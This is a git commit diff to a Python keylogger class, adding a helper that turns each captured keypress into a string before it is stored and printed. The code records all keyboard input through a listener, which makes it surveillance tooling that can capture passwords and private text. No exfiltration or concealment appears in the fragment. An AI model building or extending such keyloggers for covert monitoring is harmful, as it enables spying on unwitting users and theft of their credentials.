56b1a8da3735110cbfd6bce37193f81c5e344d17
Netanel Fadida <fnati02@gmail.com>
2025-02-23 15:10:17 +0200

    Add Format function to every key

--- KeyLoggerService/KeyLoggerService.py
+++ KeyLoggerService/KeyLoggerService.py
@@ -10,11 +10,20 @@ class KeyLoggerService(IKeyLogger):
     #The listener start to listen to everey press keyboard
     def start_logging(self):
         self.listener.start()
-    
+
     #Add to data the press keyboard
     def __on_press(self, key):
-        print(key)
-        self.data.append(key)
+        key_str = self.__format_key(key)
+        self.data.append(key_str)
+        print(key_str)
+
+    #Format every key to str
+    def __format_key(self, key):
+        if isinstance(key, Key):
+            return f"[{key.name.upper()}]"
+        else:
+            return key.char if hasattr(key, 'char') else str(key)
+
 
 
 
